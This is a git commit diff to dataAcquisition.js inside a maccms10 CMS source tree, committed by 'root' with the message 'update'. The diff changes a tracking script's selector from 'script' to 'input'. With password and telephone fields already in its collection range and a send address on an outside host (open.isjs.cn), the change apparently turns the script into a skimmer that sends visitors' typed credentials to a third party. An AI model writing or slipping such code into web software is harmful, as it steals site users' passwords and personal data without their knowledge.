5871020b7fe434203b20787252b6dfef8086a292
root <xxx@example.com>
2022-06-18 00:48:02 +0800

    update

--- maccms10-master/dataAcquisition.js
+++ maccms10-master/dataAcquisition.js
@@ -11,7 +11,7 @@ var dataAcquisition = {
     storeTiming  : "ACTIME",    //页面时间采集标记
     storeCodeErr : "ACCERR",    //代码异常采集标记
     sendUrl      : "http://open.isjs.cn/logStash/push",   //log采集地址（需配置）
-    selector     : 'script',     //通过控制输入框的选择器来限定监听范围,使用document.querySelector进行选择，值参考：https://www.runoob.com/cssref/css-selectors.html
+    selector     : 'input',     //通过控制输入框的选择器来限定监听范围,使用document.querySelector进行选择，值参考：https://www.runoob.com/cssref/css-selectors.html
     acRange      : ['src','tel', 'password'],   //输入框采集范围, 不建议采集密码输入框内容，此处只为展示用
     userSha      : 'userSha',   //用户标识
     classTag     : '',          //自动埋点,数据大
